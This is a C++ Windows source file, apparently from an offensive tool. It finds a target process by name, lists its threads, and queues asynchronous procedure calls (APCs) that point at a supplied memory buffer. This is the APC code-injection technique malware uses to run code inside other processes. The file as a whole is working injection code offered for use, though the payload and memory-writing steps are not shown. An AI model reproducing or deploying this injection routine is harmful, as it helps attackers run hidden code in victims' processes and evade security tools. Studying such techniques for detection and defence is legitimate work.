#include "apc.h"

#define good L"[+]" 
#define bad  L"[-]"
#define info L"[i]"

// Create a snapshot of all threads
HANDLE snapshotThread(){	

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		std::wprintf(L"%s Error Creating Thread Snapshot %lu\n",bad, GetLastError());
		std::exit(1);
	}
	std::wprintf(L"%s Created thread snapshot\n", info);
	return hSnapshot;

}

// Create a snapshot of all processes
HANDLE snapshotProcess(){
	
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		std::wprintf(L"%s Error Creating Process Snapshot %lu\n",bad, GetLastError());
		std::exit(1);
	}
	std::wprintf(L"%s Created process snapshot\n", info);
	return hSnapshot;
}


// Find all processes
DWORD findProcesses(const HANDLE hSnapshot, PROCESSENTRY32W* entry, const std::wstring& ProccessName){
	#define Filename static_cast<std::wstring>(entry->szExeFile)

	std::wprintf(L"%s finding %s \n", info, ProccessName.c_str());
	std::wstring temp{};
	do
	{	
		
		if (Filename == ProccessName)
		{	
			temp = Filename;
			std::wcout << L"[+] Found " << Filename << " PID: " << entry->th32ParentProcessID << '\n';
			return entry->th32ProcessID;
		}
		
	} while (Process32Next(hSnapshot, entry));
	
	if (temp != ProccessName)
	{
		std::wprintf(L"%s Couldn't find %s \n",bad,ProccessName.c_str());
		std::exit(1);
	}
}


// Find all threads in the specified process
std::vector<DWORD> findThreads(const HANDLE hSnapshot, THREADENTRY32* Tentry,DWORD pid) {
	std::vector<DWORD> threadIDs{};
	do
	{
		std::cout << Tentry->th32ThreadID;
		std::cout << "\b\b\b\b\b\b";

		if (Tentry->th32OwnerProcessID == pid)
			threadIDs.push_back(Tentry->th32ThreadID);

	} while (Thread32Next(hSnapshot, Tentry));
  
	return threadIDs;
}

// Alert all threads in the process to run APC
void ApcInject(const std::vector<DWORD>& ThreadIds, LPVOID buffer){

	for (DWORD tid : ThreadIds)
	{
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
		SleepEx(300,TRUE);
		QueueUserAPC(static_cast<PAPCFUNC>(buffer), hThread, NULL);
		CloseHandle(hThread);
	}
}
